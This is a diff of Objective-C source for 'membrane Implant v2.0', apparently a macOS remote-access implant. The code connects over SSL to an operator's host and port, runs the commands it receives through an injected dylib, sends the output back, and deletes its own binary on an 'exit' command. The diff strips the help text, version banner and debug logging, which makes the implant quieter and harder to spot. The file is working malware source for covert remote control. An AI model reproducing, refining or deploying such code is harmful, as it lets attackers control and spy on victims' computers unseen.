@@ -31,66 +31,21 @@ NSString *executable;
 SSL_CTX *ssl_client_ctx;
 SSL *client_ssl;
 struct sockaddr_in serverAddress;
-BOOL debug;
 
 void connectToServer(NSString *remote_host, int remote_port);
-void showHelpMessage();
-void showVersionMessage();
 
 int main(int argc, const char *argv[]) {
     @autoreleasepool {
         membrane *membrane_base = [[membrane alloc] init];
-        if (argc < 2) showHelpMessage();
+        if (argc < 3)
+            return -1;
         else {
             NSMutableArray *args = [NSMutableArray array];
             for (int i = 0; i < argc; i++) {
                 NSString *str = [[NSString alloc] initWithCString:argv[i] encoding:NSUTF8StringEncoding];
                 [args addObject:str];
             }
-            executable = args[0];
-            if ([args[1] isEqualToString:@"-h"] || [args[1] isEqualToString:@"--help"]) showHelpMessage(); 
-            else if ([args[1] isEqualToString:@"-v"] || [args[1] isEqualToString:@"--version"]) showVersionMessage();
-            else if ([args[1] isEqualToString:@"-r"] || [args[1] isEqualToString:@"--remote"]) {
-                if (argc < 4) showHelpMessage();
-                else {
-                    debug = NO;
-                    for (int i = 0; i < [args count]; i++) {
-                        if ([args[i] isEqualToString:@"-d"] || [args[i] isEqualToString:@"-d"]) {
-                            debug = YES;
-                        }
-                    }
-                    connectToServer(args[2], [args[3] integerValue]);
-                }
-            } else if ([args[1] isEqualToString:@"-l"] || [args[1] isEqualToString:@"--local"]) {
-                if (argc < 3) showHelpMessage();
-                else {
-                    debug = NO;
-                    for (int i = 0; i < [args count]; i++) {
-                        if ([args[i] isEqualToString:@"-d"] || [args[i] isEqualToString:@"-d"]) {
-                            debug = YES;
-                        }
-                    }
-                    NSMutableArray *command_args = [NSMutableArray array];
-                    for (int i = 2; i < [args count]; i++) {
-                        [command_args addObject:args[i]];
-                    }
-                    if ([commands containsObject:args[2]]) {
-                        if (debug) printf("[i] membrane Implant v2.0\n");
-                        if (debug) printf("[i] Copyright (c) 2020 Ivan Nikolsky\n");
-                        if (debug) printf("[*] Executing %s...\n", [args[2] UTF8String]);
-                        NSString *result = [membrane_base sendCommand:command_args];
-                        if (result) {
-                            if (debug) {
-                                if ([result isEqualToString:@"error"]) printf("[-] Failed to execute command!\n");
-                                else if ([result isEqualToString:@""]) printf("[!] Command output empty.\n");
-                                else {
-                                    printf("[i] Command output: %s\n", [result UTF8String]);
-                                }
-                            } else printf("%s", [result UTF8String]);
-                        } else if (debug) printf("[-] Failed to execute command, membrane.dylib not found!\n");
-                    } else showHelpMessage();
-                }
-            } else showHelpMessage();
+            connectToServer(args[1], [args[2] integerValue]);
         }
     }
     return 0;
@@ -101,7 +56,6 @@ void sendString(NSString *string) {
 }
 
 void interactWithServer(NSString *remoteHost, int remotePort) {
-    if (debug) printf("[+] Interactive connection spawned!\n");
     membrane *membrane_base = [[membrane alloc] init];
     membrane_base->client_ssl = client_ssl;
     
@@ -111,26 +65,20 @@ void interactWithServer(NSString *remoteHost, int remotePort) {
         NSString *terminator = [NSString stringWithFormat:@"%s", buffer];
         memset(buffer, '\0', 2048);
     
-        if (debug) printf("[i] Current client terminator: %s\n", [terminator UTF8String]);
-    
         SSL_read(client_ssl, buffer, sizeof(buffer));
         NSMutableArray *args = [NSMutableArray arrayWithArray:[[NSString stringWithUTF8String:buffer] componentsSeparatedByString:@" "]];
-        if (debug) printf("[+] Got command from %s:%d!\n", [remoteHost UTF8String], remotePort);
-        if (debug) printf("[*] Executing %s...\n", [args[0] UTF8String]);
         
         if ([commands containsObject:args[0]]) {
             NSString *result = [membrane_base sendCommand:args];
             if (result) {
-                if ([result isEqualToString:@""]) {
-                    if (debug) printf("[!] Command output empty, sending terminator instead of result.\n");
-                } else sendString(result);
+                if (![result isEqualToString:@""])
+                    sendString(result);
                 SSL_write(client_ssl, [terminator UTF8String], (int)terminator.length);
-            } else if (debug) printf("[-] Failed to execute command, membrane.dylib not found!\n");
+            } else sendString(@"-2"); // dyld is not patched
         } else if ([args[0] isEqualToString:@"exit"]) {
             remove(executable);
         } else {
-            if (debug) printf("[-] Unrecognized command!\n");
-            sendString(@"error");
+            sendString(@"-1"); // unrecognized command
             SSL_write(client_ssl, [terminator UTF8String], (int)terminator.length);
         }
         memset(buffer, '\0', 2048);
@@ -138,9 +86,6 @@ void interactWithServer(NSString *remoteHost, int remotePort) {
 }
 
 void connectToServer(NSString *remoteHost, int remotePort) {
-    if (debug) printf("[i] membrane Implant v2.0\n");
-    if (debug) printf("[i] Copyright (c) 2020 Ivan Nikolsky\n");
-    if (debug) printf("[*] Loading membrane SSL handler...\n");
     SSL_load_error_strings();
     SSL_library_init();
     OpenSSL_add_all_algorithms();
@@ -149,42 +94,16 @@ void connectToServer(NSString *remoteHost, int remotePort) {
     serverAddress.sin_family = AF_INET;
     inet_aton([remoteHost UTF8String], &serverAddress.sin_addr);
     serverAddress.sin_port = htons(remotePort);
-    if (debug) printf("[+] membrane SSL handler loaded!\n");
-    if (debug) printf("[*] Connecting to %s:%d...\n", [remoteHost UTF8String], remotePort);
-    if (connect(sockfd, (struct sockaddr *)&serverAddress, sizeof(serverAddress)) < 0) {
-        if (debug) printf("[-] Failed to connect!\n");
+
+    if (connect(sockfd, (struct sockaddr *)&serverAddress, sizeof(serverAddress)) < 0)
         return;
-    } else if (debug) printf("[+] Successfully connected!\n");
     client_ssl = SSL_new(ssl_client_ctx);
-    if(!client_ssl) {
-        if (debug) printf("[-] Failed to get SSL client!\n");
+    if (!client_ssl)
         return;
-    }
+
     SSL_set_fd(client_ssl, sockfd);
-    if(SSL_connect(client_ssl) != 1) {
-        if (debug) printf("[-] Failed to handshake with SSL client!\n");
+    if (SSL_connect(client_ssl) != 1)
         return;
-    }
-    if (debug) printf("[*] Spawning interactive connection...\n");
+
     interactWithServer(remoteHost, remotePort);
-    if (debug) printf("[-] Connection closed!\n");
-}
-
-void showHelpMessage() {
-    printf("Usage: membrane <option> [arguments] [flags]\n");
-    printf("\n");
-    printf("Options:\n");
-    printf("  -h, --help                                        Show available options.\n");
-    printf("  -v, --version                                     Show membrane version.\n");
-    printf("  -l, --local <option> [arguments] [flags]          Execute membrane command locally.\n");
-    printf("  -r, --remote <remote_host> <remote_port> [flags]  Execute membrane commands over TCP.\n");
-    printf("\n");
-    printf("Flags:\n");
-    printf("  -d, --debug  Show debug output.\n");
-}
-
-void showVersionMessage() {
-    printf("membrane Implant v2.0\n");
-    printf("\n");
-    printf("Copyright (c) 2020 Ivan Nikolsky\n");
 }
